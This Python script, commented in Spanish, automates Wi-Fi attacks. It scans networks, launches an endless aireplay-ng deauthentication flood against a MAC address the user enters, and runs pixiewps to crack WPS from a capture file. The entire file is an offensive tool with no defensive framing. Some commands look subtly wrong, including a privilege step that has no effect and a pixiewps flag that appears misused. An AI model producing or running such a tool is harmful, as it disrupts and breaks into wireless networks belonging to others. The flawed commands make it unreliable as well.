import subprocess
import time

def run_command(command):
    """Ejecuta un comando de shell y muestra la salida"""
    process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout, stderr = process.communicate()
    
    if process.returncode == 0:
        print(stdout.decode())
    else:
        print(stderr.decode())

def scan_wifi():
    """Escanear redes Wi-Fi cercanas"""
    print("Escaneando redes Wi-Fi...")
    run_command("iw dev wlan0 scan | grep SSID")

def deauth_attack(target_mac):
    """Realizar un ataque de desautenticación"""
    print(f"Realizando ataque de desautenticación contra {target_mac}...")
    run_command(f"sudo aireplay-ng --deauth 0 -a {target_mac} wlan0")

def pixiewps_attack(target_pcap):
    """Realizar un ataque Pixiewps sobre un archivo pcap"""
    print(f"Realizando ataque Pixiewps sobre {target_pcap}...")
    run_command(f"pixiewps -r {target_pcap} -o cracked.txt")

def main():
    # Asegurarse de tener permisos de superusuario
    run_command("tsu")
    
    # Escanear redes Wi-Fi
    scan_wifi()
    
    # Esperar y hacer el ataque de desautenticación (Ejemplo con MAC)
    target_mac = input("Introduce la MAC del objetivo para desautenticación: ")
    deauth_attack(target_mac)
    
    # Realizar ataque Pixiewps
    target_pcap = input("Introduce el archivo pcap para Pixiewps: ")
    pixiewps_attack(target_pcap)

if __name__ == "__main__":
    main()







